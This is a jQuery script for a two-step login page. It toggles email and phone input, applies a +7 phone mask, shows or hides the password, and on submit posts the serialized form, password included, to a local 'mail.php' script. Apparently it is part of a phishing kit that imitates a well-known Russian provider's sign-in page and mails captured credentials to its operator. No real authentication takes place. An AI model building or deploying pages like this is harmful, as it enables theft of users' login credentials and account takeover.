

  if ($('.email-block').hasClass('active')) {
    $('.input-email').addClass('active');
  }
  if ($('.phone-block').hasClass('active')) {
    $('.input-phone').addClass('active');
  }

  $('.AuthLoginInputToggle-type').click(function(){
    $('.AuthLoginInputToggle-type').removeClass('active');
    $(this).addClass('active');
    if ($('.email-block').hasClass('active')) {
      $('.input-email').addClass('active');
    }else{
      $('.input-email').removeClass('active');
    }
    if ($('.phone-block').hasClass('active')) {
      $('.input-phone').addClass('active');
    }else{
      $('.input-phone').removeClass('active');
    }
  });
  
  $('#phone').mask('+7(000) 000-000-00', {placeholder: "+7("});
   

  $('.voiti').click(function(){
    var inputValue = $('.form-input').val();
  
    if (inputValue === '') {
      $('.error').addClass('active');
      $('.first .input-email input').addClass('error-input');
      $('.first .input-phone input').addClass('error-input');
      
    }
    else{
      $('form > div').removeClass('hidden-section');
      $('form > div').removeClass('show-section');
      $('.first').addClass('hidden-section');
      $('.second').addClass('show-section');
      $('.error').removeClass('active');
    }
  });


// $('.voiti').click(function(){
//   $('form > div').removeClass('hidden-section');
//   $('form > div').removeClass('show-section');
//   $('.first').addClass('hidden-section');
//   $('.second').addClass('show-section');
// });
$('.back-icon').click(function(){
  $('form > div').removeClass('hidden-section');
  $('form > div').removeClass('show-section');
  $('.first').addClass('show-section');
  $('.second').addClass('hidden-section');
});
$('.second .login-info').click(function(){
  $('form > div').removeClass('hidden-section');
  $('form > div').removeClass('show-section');
  $('.first').addClass('show-section');
  $('.second').addClass('hidden-section');
});



$('.first .input .form-input').on('input', function() {
  var inputValue = $(this).val();
  $('.user-login span').text(inputValue);
});
$('.first .input #phone').on('input', function() {
  var inputValue = $(this).val();
  $('.user-login span').text(inputValue);
});

$('#showPass').click(function(){
  $('#showPass').addClass('hidden');
  $('#showPass').removeClass('active');
  $('#hidePass').removeClass('hidden')
  $('#hidePass').addClass('active');  
  $("#myPass").attr("type", "text");
});

$('#hidePass').click(function(){
  $('#hidePass').addClass('hidden');
  $('#hidePass').removeClass('active');
  $('#showPass').removeClass('hidden')
  $('#showPass').addClass('active'); 
  $("#myPass").attr("type", "password") 
});



$(document).ready(function() {

  $('.form').submit(function (event) {
      event.preventDefault();
      var formData = $(this).serialize();
      var form = this;
      // console.log(formData);
      $.ajax({
          type: 'POST',
          url: './mail.php',
          data: formData,
          success: function(data){
              successSend(form);
          },
      })
  });
});

function successSend(form){
  $(form).find('input').val('');
}